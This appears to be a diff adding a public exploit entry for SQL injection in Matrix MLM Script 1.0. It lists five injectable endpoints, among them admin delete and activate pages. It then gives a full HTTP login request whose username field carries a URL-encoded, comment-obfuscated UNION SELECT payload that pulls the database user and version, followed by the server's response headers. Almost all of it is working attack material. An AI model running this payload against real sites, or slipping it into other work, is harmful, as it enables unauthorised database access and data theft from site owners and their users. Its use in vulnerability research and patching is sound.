@@ -1,0 +1,44 @@
+# Exploit Title: Matrix MLM Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-10
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://royallifefoundation.org/
+# Software Link: https://codecanyon.net/item/mlmpro-multistage-forced-matrix-mlm-script/23050292
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/login.php?section=login
+# http://localhost/[PATH]/modules/deleteadmin.php?id=[SQL]
+# http://localhost/[PATH]/modules/deletepin.php?id=[SQL]
+# http://localhost/[PATH]/modules/activateadmin.php?id=[SQL]
+# http://localhost/[PATH]/?section=read&mailid=[SQL]
+# 
+
+POST /[PATH]/login.php?section=login HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 538
+Cookie: PHPSESSID=e1js8vek57sgge2oso51do2255
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+username=%2d%31%27%20%55%4eI%4f%4e%20%2f%2a%21%31%31%31%31%31%53EL%45%43%54%2a%2f%20%31%2c%32%2c%33%2c%34%2c%35%2c%36,%43%4f%4e%43%41%54%28%55%53%45%52%28%29%2c%30%78%32%64%2c%56%45%52%53%49%4f%4e%28%29%29%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36,%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%2c%32%37%2c%32%38%2c%32%39%2c%33%30%2c%33%31%2c%33%32%2c%33%33%2c%33%34%2c%33%35%2c%33%36%2c%33%37%2c%33%38%2c%33%39%2c%34%30%2c%34%31%2d%2d%20%2d&password=&submit=Login: undefined
+HTTP/1.1 302 Moved Temporarily
+Date: Wed, 09 Jan 2019 17:09:32 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.39
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: /index.php
+Vary: Accept-Encoding,User-Agent
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
